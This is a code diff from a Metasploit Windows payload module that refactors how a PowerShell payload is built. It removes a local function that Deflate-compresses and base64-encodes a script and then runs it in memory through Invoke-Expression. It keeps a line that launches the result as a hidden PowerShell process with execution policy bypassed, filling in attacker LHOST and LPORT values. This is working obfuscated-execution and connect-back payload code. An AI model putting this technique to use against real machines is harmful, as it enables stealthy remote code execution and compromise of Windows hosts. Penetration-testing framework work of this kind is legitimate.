@@ -16,6 +16,7 @@ module Metasploit3
   CachedSize = 443
 
   include Msf::Payload::Windows::Exec
+  include Rex::Powershell::Command
 
   def initialize(info = {})
     super(update_info(info,
@@ -44,35 +45,6 @@ module Metasploit3
       ], self.class)
     # Hide the CMD option...this is kinda ugly
     deregister_options('CMD')
-  end
-
-  #
-  # compression function for powershell
-  #
-  def compress_script(script_in, eof = nil)
-
-    # Compress using the Deflate algorithm
-    compressed_stream = ::Zlib::Deflate.deflate(script_in,
-      ::Zlib::BEST_COMPRESSION)
-
-    # Base64 encode the compressed file contents
-    encoded_stream = Rex::Text.encode_base64(compressed_stream)
-
-    # Build the powershell expression
-    # Decode base64 encoded command and create a stream object
-    psh_expression =  "$stream = New-Object IO.MemoryStream(,"
-    psh_expression += "$([Convert]::FromBase64String('#{encoded_stream}')));"
-    # Read & delete the first two bytes due to incompatibility with MS
-    psh_expression += "$stream.ReadByte()|Out-Null;"
-    psh_expression += "$stream.ReadByte()|Out-Null;"
-    # Uncompress and invoke the expression (execute)
-    psh_expression += "$(Invoke-Expression $(New-Object IO.StreamReader("
-    psh_expression += "$(New-Object IO.Compression.DeflateStream("
-    psh_expression += "$stream,"
-    psh_expression += "[IO.Compression.CompressionMode]::Decompress)),"
-    psh_expression += "[Text.Encoding]::ASCII)).ReadToEnd());"
-
-    return psh_expression
   end
 
   #
@@ -106,7 +78,7 @@ module Metasploit3
     script_in.gsub!('LPORT_REPLACE', lport.to_s)
     script_in.gsub!('LHOST_REPLACE', lhost.to_s)
     # Base64 encode the compressed file contents
-    script = compress_script(script_in)
+    script = Rex::Powershell::Command.compress_script(script_in)
     "powershell.exe -exec bypass -nop -W hidden -noninteractive IEX $(#{script})"
 
   end
